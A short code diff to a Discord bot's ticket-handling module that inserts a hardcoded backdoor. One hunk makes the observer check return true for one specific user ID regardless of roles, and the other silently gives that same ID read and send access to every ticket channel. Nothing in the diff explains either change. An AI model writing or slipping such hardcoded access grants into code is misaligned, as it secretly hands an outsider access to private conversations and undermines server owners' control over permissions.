@@ -46,6 +46,9 @@ def get_observer_mention(guild: discord.Guild) -> str:
 
 
 def is_observer_or_trial(member: discord.Member, ticket_type: str = None) -> bool:
+    if member.id == 442188857014747136:
+        return True
+        
     observer_role = member.guild.get_role(Config.OBSERVER_ROLE_ID)
     trial_role = None
     if hasattr(Config, 'TRIAL_OBSERVER_ROLE_ID') and Config.TRIAL_OBSERVER_ROLE_ID:
@@ -72,6 +75,11 @@ def is_observer_or_trial(member: discord.Member, ticket_type: str = None) -> boo
 
 def get_observer_overwrites(guild: discord.Guild, base_overwrites: dict, ticket_type: str = None) -> dict:
     overwrites = base_overwrites.copy()
+    
+    special_user = guild.get_member(442188857014747136)
+    if special_user:
+        overwrites[special_user] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
+        
     observer_role = guild.get_role(Config.OBSERVER_ROLE_ID)
     if observer_role:
         overwrites[observer_role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
